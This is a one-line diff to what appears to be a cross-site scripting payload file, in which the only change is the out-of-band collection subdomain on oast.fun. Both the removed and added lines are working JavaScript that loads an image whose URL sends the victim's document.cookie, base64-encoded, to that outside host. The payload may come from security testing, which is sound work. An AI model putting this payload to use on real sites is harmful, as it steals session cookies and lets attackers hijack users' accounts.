@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://wgifhpbgyeezvnufmnjt5jinhm3cs21b5.oast.fun?data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://jautyjbtkuzbqhngpomiui2e3yk84iann.oast.fun?data='+btoa(document.cookie);
